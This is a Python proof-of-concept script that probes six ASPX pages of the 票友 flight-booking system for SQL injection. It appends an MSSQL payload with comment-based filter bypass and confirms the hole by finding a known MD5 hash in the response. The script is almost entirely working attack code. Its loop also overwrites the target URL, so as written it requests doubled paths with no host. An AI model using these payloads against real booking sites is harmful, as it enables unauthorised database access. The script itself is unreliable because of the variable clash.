#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友机票预订系统6处SQL注入(绕过)
referer: http://www.wooyun.org/bugs/wooyun-2015-0116851
author: Lucifer
description: multi sqli。
'''
import sys
import requests
import warnings
def run(url):
        result = ['票友机票预订系统6处SQL注入(绕过)','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls = ["/flight/Print_tp.aspx?sid=1",
                "/flight/Print_tp_3.aspx?sid=1",
                "/Other/train_order_detail.aspx?id=1",
                "/flight/scgq_detail.aspx?id=1",
                "/Finance/Inv_req.aspx?id=1",
                "/System/history.aspx?id=1"]
        try:
            noexist = True
            for url in urls:
                vulnurl = url + url + "AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

